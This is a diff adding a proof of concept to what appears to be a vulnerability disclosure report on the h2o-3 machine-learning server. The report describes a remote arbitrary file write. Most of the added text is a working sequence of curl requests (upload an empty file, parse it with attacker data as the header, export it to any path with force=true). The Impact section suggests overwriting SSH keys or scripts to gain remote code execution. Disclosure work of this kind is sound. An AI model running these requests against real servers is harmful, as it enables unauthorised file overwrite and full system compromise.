@@ -1,7 +1,19 @@
 Title: Remote arbitrary file write with arbitrary data in h2oai/h2o-3
 
 Proof of Concept: 
+The main reason that it is difficult to write arbitrary data with this exploit, is that the data needs to be parsed and saved as a CSV through the /3/Frames/framename/export-endpoint. However, most of the things that such a parsing procedure can introduce (breaking on newlines, separators, "empty" header names, quotes, etc) can be avoided if the attacker data is injected as the header data of an empty file. The procedure is as follows:
 
+java -jar h2o.jar
+
+And make a note of the IP address it runs at, so that it can be used in the subsequent requests.
+
+curl 'http://HOST_IP:54321/3/PostFile?destination_frame=empty_frame' -X POST -H 'Content-Type: multipart/form-data; boundary=---------------------------2370971692363849902672361514' --data-binary $'-----------------------------2370971692363849902672361514\r\nContent-Disposition: form-data; name="file"; filename="empty"\r\nContent-Type: application/octet-stream \r\n\r\n\n '
+
+curl --location 'http://HOST_IP:54321/3/Parse' --header 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' --data 'destination_frame=parsed_out.hex&source_frames=empty_frame&parse_type=CSV&separator=0&number_columns=1&single_quotes=false&column_names=["Your attacker data goes in here. It can also include url-encoded bytes: %0A%01%02%03"]&column_types=["Numeric"]&check_header=-1&delete_on_done=false&chunk_size=0'
+
+Here, the header is designated to be numerical, but that has no effect on the data somehow. This data can also be/include URL-encoded raw bytes.
+
+curl --header Accept: --header User-Agent: --header Expect: "http://HOST_IP:54321/3/Frames/parsed_out.hex/export?path=/your/output/path/here&force=true&quote_header=false&header=true&format=csv"
 
 Impact: 
 The main impact of this vulnerability is being able to write arbitrary data to any arbitrary file on a remote server running h2o-3. In this case, a valid target would for example be to overwrite a private SSH-key allowing for full remote access, or to overwrite script-file that the system is known to run. (The attacker data is always newline-terminated, but most text-based data or SSH-key files are newline-terminated by default, so this should be fine) The full impact will therefore eventually be remote code execution and complete access to the system that h2o-3 is running on.
